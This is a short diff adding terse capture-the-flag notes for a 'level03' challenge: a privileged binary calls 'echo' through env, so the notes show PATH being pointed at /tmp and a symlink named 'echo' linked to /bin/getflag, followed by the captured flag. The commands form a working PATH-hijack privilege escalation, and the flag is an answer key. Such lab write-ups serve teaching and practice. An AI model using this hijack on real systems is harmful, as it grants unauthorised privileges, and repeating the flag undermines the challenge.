@@ -1,0 +1,7 @@
+ls in home, we see exec level03
+strings level03, we get /usr/bin/env echo Exploit me
+we can write in /tmp
+export PATH=/tmp:$PATH
+in /tmp, ln -s /bin/getflag echo
+in home, ./level03
+flag: qi0maab88jeaj46qoumi7maus
